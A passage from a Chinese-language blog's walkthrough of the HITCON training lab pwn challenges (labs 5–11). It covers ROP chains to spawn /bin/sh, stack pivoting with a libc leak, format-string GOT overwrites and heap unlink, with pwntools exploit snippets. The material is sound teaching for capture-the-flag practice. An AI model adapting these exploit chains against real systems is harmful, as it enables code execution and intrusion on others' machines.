style="font-size:15px;line-height:35px;;">checksec</span></figcaption></figure><p><span style="font-size:15px;line-height:35px;;">既然是简单的ROP，那我们构造一条简单的ROP链即可。</span></p><figure><img data-ratio="0.09431345353675451" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/21_R49icDhCa2Yia1RJzQreA222WFgAFw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KOXO5mgTVXXBdJicRTK49EKsHtjGR49icDhCa2Yia1RJzQreA222WFgAFw/640?wx_fmt=png'" data-type="png" data-w="721" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption><span style="font-size:15px;line-height:35px;;">静态链接</span></figcaption></figure><p><span style="font-size:15px;line-height:35px;;">既然是静态链接，我们就需要找一些有用的gadgets。</span></p><figure><img data-ratio="0.2597809076682316" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/22_ZW7R7NGibkbJJGBDyibT1Fbo8PR2tg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1K6QlWZ15vBEiavmb06DeEibT8pkrwZW7R7NGibkbJJGBDyibT1Fbo8PR2tg/640?wx_fmt=png'" data-type="png" data-w="639" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption><span style="font-size:15px;line-height:35px;;">int 0x80</span></figcaption></figure><p><span style="font-size:15px;line-height:35px;;">考虑syscall调用来get shell。</span></p><blockquote><p><span style="font-size:15px;line-height:35px;;">利用特殊的gadget 例如是 mov dword ptr [ecx],eax ， 将字符串压入eax中，要写入的地址压入ecx中，然后通过这个gadget就可以将字符串写入想写入的内存了</span></p></blockquote><figure><img data-ratio="0.2336065573770492" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/23_Rj4aCadVcNk2p425cmjCn901j8xJvg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KzfgpuKZibsfZAdogZlNq7OZDXRj4aCadVcNk2p425cmjCn901j8xJvg/640?wx_fmt=png'" data-type="png" data-w="488" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption><span style="font-size:15px;line-height:35px;;">some gadgets</span></figcaption></figure><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="makefile"><code><span class="code-snippet_outer"><span class="code-snippet__comment">###write /bin/sh into memory###</span></span></code><code><span class="code-snippet_outer">payload = 'A' * 28 + 'dead'</span></code><code><span class="code-snippet_outer">payload+= p32(pop_edx_ret) + p32(bss) + p32(pop_eax_ret) + <span class="code-snippet__string">"/bin"</span> + p32(gadget)</span></code><code><span class="code-snippet_outer">payload+=&nbsp;p32(pop_edx_ret)&nbsp;+&nbsp;p32(bss+4)&nbsp;+&nbsp;p32(pop_eax_ret)&nbsp;+&nbsp;<span class="code-snippet__string">"/sh\x00"</span>&nbsp;+&nbsp;p32(gadget)</span></code></pre></section><p><span style="font-size:15px;line-height:35px;;font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">接着把syscall的参数压入寄存器</span><br  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="makefile"><code><span class="code-snippet_outer">//execve(<span class="code-snippet__string">"/bin/sh\x00"</span>,0,0) </span></code><code><span class="code-snippet_outer">//对应为 eax=0xb(系统调用号) ebx = buf ;edx=0 ; ecx = 0  </span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">###push argv into register###</span></span></code><code><span class="code-snippet_outer">payload+= p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bss)</span></code><code><span class="code-snippet_outer">payload+= p32(pop_eax_ret) + p32(0xb) + p32(int_80)</span></code></pre></section><pre><span style="font-size:15px;line-height:35px;;"></span></pre><p><span style="font-size:15px;line-height:35px;;">结果没有get shell…</span></p><figure><img data-backh="50" data-backw="334" data-ratio="0.1497005988023952" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/24_5KKs961nuZib86LdfictBiaSqkriag.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KuvvBVVt5EeDJibMPmQ2sZeql6E6X95KKs961nuZib86LdfictBiaSqkriag/640?wx_fmt=png'" data-type="png" data-w="334" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /></figure><figure><img data-ratio="0.329957805907173" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/25_wqtTBhCkKjKpuTmtjTPWja1nHibZIg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KiaFVJgXdkUGrq7QNEII3QrG0BjwqtTBhCkKjKpuTmtjTPWja1nHibZIg/640?wx_fmt=png'" data-type="png" data-w="1185" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption style="text-align: center;"><span style="font-size:15px;line-height:35px;;">get shell</span></figcaption></figure><p><br  /></p><p><br  /></p><h2 style="text-align: center;"><span style="font-size:20px;line-height:40px;;"><strong>lab6- migration //stack &nbsp;pivoting</strong></span></h2><p><span style="font-size:20px;line-height:40px;;"><strong><br  /></strong></span></p><figure><img data-backh="160" data-backw="529" data-ratio="0.30245746691871456" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/26_vntRt8LHWMSgSZOia4eOO0XcpJnyPw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KjTuswkWd9RTYlLsH5iaBLXUicxpvntRt8LHWMSgSZOia4eOO0XcpJnyPw/640?wx_fmt=png'" data-type="png" data-w="529" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /><figcaption>main</figcaption></figure><p>存在一个stack overflow的情况，但是可溢出的大小只有(0x40-0x28)=0x18</p><p><br  /></p><p>然后判断条件是如果我们返回main不满足条件就直接退出</p><figure><img data-ratio="0.2850678733031674" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/27_TdE8QbSwrcX3K84ejc99KgMTBgK5xA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KOiay0MFDCEJ4H6LCXo8boTiamETdE8QbSwrcX3K84ejc99KgMTBgK5xA/640?wx_fmt=png'" data-type="png" data-w="442" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><figure><img data-ratio="0.625" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/28_cXU7Rj4wInmHU99ibrIlbzX5vaxStA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KnjticATpevwbxxHW5U2ZCKQHQ8cXU7Rj4wInmHU99ibrIlbzX5vaxStA/640?wx_fmt=png'" data-type="png" data-w="1200" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>stack pivot</figcaption></figure><p>More About Stack Pivot：</p><p><strong>http://www.pwn4fun.com/pwn/stack-pivot-and-stack-smash.html</strong></p><p><br  /></p><p>栈迁移的一种实现方法：</p><p>通过ebp,esp将栈劫持到bss段上，将ebp覆盖为fake_ebp，然后利用leave_ret这个gadget将esp劫持到fake_ebp，然后就是正常的ret2libc。</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="perl"><code><span class="code-snippet_outer">leave_ret:</span></code><code><span class="code-snippet_outer">mov %ebp,%esp  </span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">pop</span> %ebp  </span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">pop</span> %eip</span></code></pre></section><figure><img data-ratio="0.22585227272727273" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/29_cTDpS5mTLaPic3vVzHruCROeLsF5eA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KcJmqbU3MqXDp0aicuYnw1RXgeticTDpS5mTLaPic3vVzHruCROeLsF5eA/640?wx_fmt=png'" data-type="png" data-w="704" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="makefile"><code><span class="code-snippet_outer"><span class="code-snippet__comment">###stack provit###</span></span></code><code><span class="code-snippet_outer">payload = 'A' * 0x28 + p32(bss+0x200) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss+0x200) + p32(0x100)</span></code><code><span class="code-snippet_outer">p.send(payload)</span></code></pre></section><pre>注意send。<br  /></pre><figure><img data-ratio="1.064030131826742" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/30_iaLpkPibdAlBJRtrdUdBH0xTjicfCQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1Kc4TScjS74PtIQYKQ4jklGmNOoHXiaLpkPibdAlBJRtrdUdBH0xTjicfCQ/640?wx_fmt=png'" data-type="png" data-w="531" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>此时栈的情况</figcaption></figure><p>现在的ebp已经被覆盖为了bss+0x200，然后会执行leave_ret，将ebp的值赋给esp，此时栈就被劫持到了bss+0x200处。</p><p>接下来要泄露libc，为了保持栈的平衡，还需要其他的gadget。</p><figure><img data-ratio="0.325115562403698" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/31_y9hh92ZVF4Pg2ica7l2jNkk9whXXBQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KicNyfOORATIDgwJyoGRsS426JHy9hh92ZVF4Pg2ica7l2jNkk9whXXBQ/640?wx_fmt=png'" data-type="png" data-w="649" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><br  /></p><p>泄露libc我们要将栈迁移到另一个我们能控制的地方,bss+0x100即可。</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="makefile"><code><span class="code-snippet_outer"><span class="code-snippet__comment">###leak libc###</span></span></code><code><span class="code-snippet_outer">payload = p32(bss+0x100) + p32(puts_plt) + p32(pop_ebx_ret) + p32(puts_got) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss+0x100) + p32(0x100)</span></code><code><span class="code-snippet_outer">p.sendline(payload)</span></code><code><span class="code-snippet_outer">puts_addr = u32(p.recv(4))</span></code></pre></section><figure><img data-ratio="0.6701183431952663" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/32_5Th1HJb76D2dVwkktKfZEumc2s64RA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KoS8UTUQkxAnStzibrBgBXzQxO5Th1HJb76D2dVwkktKfZEumc2s64RA/640?wx_fmt=png'" data-type="png" data-w="676" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>此时的栈布局</figcaption></figure><figure><img data-ratio="0.5643153526970954" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/33_Wh1PVyTCqz9YjovFnicKtG6KZsj3tw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KYIfiagiahB418yY57SQ2CJ5s3oibWh1PVyTCqz9YjovFnicKtG6KZsj3tw/640?wx_fmt=png'" data-type="png" data-w="723" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>leak successfully</figcaption></figure><p>接下来就是get shell。通过read读入sh。</p><p>需要注意的是为了保持栈平衡，仍然需要gadgets。</p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.30873493975903615" data-s="300,640" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/34_HghJSD3KNPYBVzmntAwc73B9WjE6Pw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KkdfFEfCDl7q3xNMuMjlWdL4MHghJSD3KNPYBVzmntAwc73B9WjE6Pw/640?wx_fmt=png'" data-type="png" data-w="664" style=""  /></p><p>get shell尝试不成功…后来发现只要劫持到Bss+0x200就会失败。</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="perl"><code><span class="code-snippet_outer"><span class="code-snippet__comment">###get shell###</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">system</span> = libc_base + libc.dump(<span class="code-snippet__string">'system'</span>)</span></code><code><span class="code-snippet_outer">payload= p32(bss+<span class="code-snippet__number">0x500</span>) + p32(read_plt) + p32(pop_ret) + p32(<span class="code-snippet__number">0</span>) + p32(bss+<span class="code-snippet__number">0x500</span>) + p32(<span class="code-snippet__number">0x20</span>) + p32(<span class="code-snippet__keyword">system</span>) + <span class="code-snippet__string">'dead'</span> + p32(bss+<span class="code-snippet__number">0x500</span>)</span></code><code><span class="code-snippet_outer">p.send(payload)</span></code><code><span class="code-snippet_outer">p.send(<span class="code-snippet__string">'/bin/sh\x00'</span>)</span></code><code><span class="code-snippet_outer">p.interactive()</span></code></pre></section><figure><img data-ratio="0.45875937286980234" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/35_n9OSArr1ibxWmvOaqibYsHukXPDecg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KJ961ZsYp4n2e2P8fJwkS5QSiaKEn9OSArr1ibxWmvOaqibYsHukXPDecg/640?wx_fmt=png'" data-type="png" data-w="1467" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>get shell</figcaption></figure><hr style="box-sizing: inherit;background-color: rgba(51, 51, 51, 0.1);border-width: 0px;border-style: initial;border-color: initial;height: 1px;margin-bottom: 1.6842em;margin-left: auto;margin-right: auto;max-width: 100px;font family: &quot;Noto Serif&quot;, serif;font-size:19px;line-height:39px;;text-align: start;white-space: normal;"  /><h2 style="text-align: center;"><span style="font-size:20px;line-height:40px;;"><strong>lab7-crack //format string</strong></span></h2><p><span style="font-size:20px;line-height:40px;;"><strong><br  /></strong></span></p><figure><img data-ratio="0.8363309352517986" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/36_RCpEPEu30ib9P8IeagcTQK7ib9mZ6Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1K1bRAickATFnvibsPBXNoR8DeMXiarRCpEPEu30ib9P8IeagcTQK7ib9mZ6Q/640?wx_fmt=png'" data-type="png" data-w="556" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>main</figcaption></figure><p>首先随机读入一个password，然后格式化字符串，然后输入密码如果相同则执行system了。</p><p>思路是这样的：利用格式化字符串改掉password的内容，然后输入即可。</p><figure><img data-ratio="0.13598901098901098" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/37_q8SmD78dNpCJdicHMGh0bR56Cxh58w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KVSFFyvwhqf8Bx9nyGujrufXTlq8SmD78dNpCJdicHMGh0bR56Cxh58w/640?wx_fmt=png'" data-type="png" data-w="728" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>offset = 10</figcaption></figure><p>此处采用pwntools自带的fmtstr_payload自动生成payload，但是64位程序不适用，具体原因及利用方式将会另开章节说明。</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="makefile"><code><span class="code-snippet_outer">payload = fmtstr_payload(offset,{address:1234})</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">p.recvuntil('What your name ? ')</span></code><code><span class="code-snippet_outer">p.sendline(payload)</span></code></pre></section><figure><img data-ratio="0.08431703204047218" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/38_FxwQXfJzerttoO5AQIyXHDAsRcnPbw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KOQMiaGZ0h6HUPxBtqrxzYLWP8FxwQXfJzerttoO5AQIyXHDAsRcnPbw/640?wx_fmt=png'" data-type="png" data-w="593" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>modify successfully</figcaption></figure><figure><img data-ratio="0.30643699002719854" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/39_d6tZDXicckiaUsCxfvnDZtibd5sVdA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KG4E6rWtJRBoczClW0fDJdZAZYMAd6tZDXicckiaUsCxfvnDZtibd5sVdA/640?wx_fmt=png'" data-type="png" data-w="1103" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>got it</figcaption></figure><hr style="box-sizing: inherit;background-color: rgba(51, 51, 51, 0.1);border-width: 0px;border-style: initial;border-color: initial;height: 1px;margin-bottom: 1.6842em;margin-left: auto;margin-right: auto;max-width: 100px;font family: &quot;Noto Serif&quot;, serif;font-size:19px;line-height:39px;;text-align: start;white-space: normal;"  /><h2 style="text-align: center;"><span style="font-size:20px;line-height:40px;;"><strong>lab8-craxme //format string</strong></span></h2><p><span style="font-size:20px;line-height:40px;;"><strong><br  /></strong></span></p><figure><img data-ratio="0.7214022140221402" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/40_dQB6PNBhxW46IxXCLNvwlRvZgicS4w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KeD72sgwSmlbloFOuPX550E7aXdQB6PNBhxW46IxXCLNvwlRvZgicS4w/640?wx_fmt=png'" data-type="png" data-w="542" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>main</figcaption></figure><figure><img data-backh="124" data-backw="378" data-ratio="0.328042328042328" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/41_jlJl4p7agRmkunthF1ZiaBQlffju0Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KewT48JNAxU94n5ZC0iasbAKQKJjlJl4p7agRmkunthF1ZiaBQlffju0Q/640?wx_fmt=png'" data-type="png" data-w="378" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /></figure><p>开了Canary以及NX，虽然存在栈溢出但是不能直接利用。</p><p>但是还有格式化字符串呢，这次可以利用format string修改GOT表。</p><figure><img data-ratio="0.14227086183310533" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/42_ia7pvoLoVfNHFM366H3MmJ5kibLGdQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1Kkawrialp52vzUzA2ZuYkSbFC8h8ia7pvoLoVfNHFM366H3MmJ5kibLGdQ/640?wx_fmt=png'" data-type="png" data-w="731" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p>计算格式化字符串偏移还有其他办法，这里不赘述。</p><figure><img data-ratio="0.2798053527980535" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/43_6fia6gMPsy3NwejucNcMzZjEnMdibg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KqQpZOsBgcSbMLhuryYthmX5rKW6fia6gMPsy3NwejucNcMzZjEnMdibg/640?wx_fmt=png'" data-type="png" data-w="1233" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>get flag</figcaption></figure><p>需要注意的是：</p><figure><img data-ratio="0.42745709828393136" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/44_bW6vo4usLibAwC821F3xhmqK9hbN5A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KBwvY0u4y2Kxq37ugmq7EwxsVObW6vo4usLibAwC821F3xhmqK9hbN5A/640?wx_fmt=png'" data-type="png" data-w="641" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p>goal地址要从push开始，不然system无参数。</p><hr style="box-sizing: inherit;background-color: rgba(51, 51, 51, 0.1);border-width: 0px;border-style: initial;border-color: initial;height: 1px;margin-bottom: 1.6842em;margin-left: auto;margin-right: auto;max-width: 100px;font family: &quot;Noto Serif&quot;, serif;font-size:19px;line-height:39px;;text-align: start;white-space: normal;"  /><h2 style="text-align: center;"><span style="font-size:20px;line-height:40px;;"><strong>lab9-playfmt //format string</strong></span></h2><p><span style="font-size:20px;line-height:40px;;"><strong><br  /></strong></span></p><p>直接看主要函数。</p><figure><img data-backh="231" data-backw="433" data-ratio="0.5334872979214781" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/45_gMickAJuyZFSKSm1ibISl2cwp4EZMA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KUUh5VHicS4RN2eTd3gpB7HyBciatgMickAJuyZFSKSm1ibISl2cwp4EZMA/640?wx_fmt=png'" data-type="png" data-w="433" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /><figcaption>do_fmt()</figcaption></figure><figure><img data-backh="124" data-backw="460" data-ratio="0.26956521739130435" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/46_jLmITGpics7EoAOicjc90gf4TBPVoQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KicJYYIIOKk6Wo6TSPxvzL6toyXvjLmITGpics7EoAOicjc90gf4TBPVoQ/640?wx_fmt=png'" data-type="png" data-w="460" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /></figure><p>思路：没有限制格式化字符串的次数，格式化字符串泄露libc并get shell。</p><p>但是需要注意buf不在栈上，而是在bss段上。</p><p><br  /></p><h2 style="text-align: center;"><strong><span style="font-size:20px;line-height:40px;;">lab10-hacknote //UAF</span></strong></h2><p><br  /></p><p>参考这篇文章即可：http://www.pwn4fun.com/pwn/uaf-example.html</p><p><br  /></p><h2 style="text-align: center;"><span style="font-size:20px;line-height:40px;;"><strong>lab11-bamboobox</strong></span></h2><p><span style="font-size:20px;line-height:40px;;"><strong><br  /></strong></span></p><figure><img data-ratio="0.795134443021767" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/47_CUbkuwymRclE77wibvEeAicmmxyRmg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KWsEpT8abZLsiceMU9QsODvnLTegCUbkuwymRclE77wibvEeAicmmxyRmg/640?wx_fmt=png'" data-type="png" data-w="781" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>main</figcaption></figure><p>可以看到v3存放了两个函数的指针。case5有调用。</p><p><br  /></p><figure><img data-backh="196" data-backw="385" data-ratio="0.509090909090909" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/48_e46mahric7UZzotrrs51A41PGAF41g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KPFzkiblvAXRpJ4d9gBvGBQ6qW0e46mahric7UZzotrrs51A41PGAF41g/640?wx_fmt=png'" data-type="png" data-w="385" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /><figcaption>menu</figcaption></figure><figure><img data-backh="221" data-backw="523" data-ratio="0.4225621414913958" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/49_DJFkNRpYtdmuZDO9txpoAblv4Zicxg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KfOnPXuCsK5zNC2M8rVPKRlDveDJFkNRpYtdmuZDO9txpoAblv4Zicxg/640?wx_fmt=png'" data-type="png" data-w="523" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /><figcaption>show</figcaption></figure><p>就是打印。</p><figure><img data-ratio="0.7162673392181589" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/50_evta3o6RDt86x9jDZwictfteTVy9Pw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KdzNuIL8MiarzyDdibg48dRZvQOtevta3o6RDt86x9jDZwictfteTVy9Pw/640?wx_fmt=png'" data-type="png" data-w="793" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>add</figcaption></figure><p>最多能创建100个item，size没有限制但是有长度限制。只有用一个指针数组用来存放chunk的地址以及size。</p><p>要注意,对size的检查没有检查是否为负值，所以如果为负值，会变成一个很大的数。</p><figure><img data-ratio="0.6601815823605707" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/51_BJqqShjbGJMsxrKj1eTk7a7icaEMmw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KzHKK4MtDdOOKdOicn8o0ZleCojBJqqShjbGJMsxrKj1eTk7a7icaEMmw/640?wx_fmt=png'" data-type="png" data-w="771" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>change</figcaption></figure><p>首先判断要改的是否存在，但是又要求输入大小，存在溢出的情况。</p><figure><img data-ratio="0.6964809384164223" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/52_xmvoPM81KdQk8LemsJNcDrRu7hVtrA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1Kjb9PfqhNDh1dPs5mMVBDawzIxmvoPM81KdQk8LemsJNcDrRu7hVtrA/640?wx_fmt=png'" data-type="png" data-w="682" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>remove</figcaption></figure><p>没有什么利用点。</p><p>思路：unlink or house of force</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="makefile"><code><span class="code-snippet_outer">unlink</span></code><code><span class="code-snippet_outer">add(0x80,'AAAA')<span class="code-snippet__comment">#0</span></span></code><code><span class="code-snippet_outer">add(0x80,'BBBB')<span class="code-snippet__comment">#1</span></span></code><code><span class="code-snippet_outer">add(0x80,'CCCC')<span class="code-snippet__comment">#2</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">payload = p64(0) + p64(0x80) + p64(fake_FD) + p64(fake_BK)</span></code><code><span class="code-snippet_outer">payload = payload.ljust(0x80,'A')</span></code><code><span class="code-snippet_outer">payload+= p64(0x80) + p64(0x90) <span class="code-snippet__comment"># make sure the prev_inuse is 0</span></span></code></pre></section><pre></pre><p>首先创建三个chunk(不属于fastbin)，然后通过chunk0溢出chunk1。</p><p>在chunk0中伪造一个0x80的fake_chunk，然后将chunk1的prev_size改为0x80（原本加上chunk head应该是0x91，未free应是0），然后修改chunk1的prev_inuse为0，让系统相信chunk0是free状态的。并且通过prev_size绕过了size的检查。</p><figure><img data-backh="550" data-backw="515" data-ratio="1.0679611650485437" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/53_RRvsbnialmgg8gibKEdZYRxZNdMCSw.png" 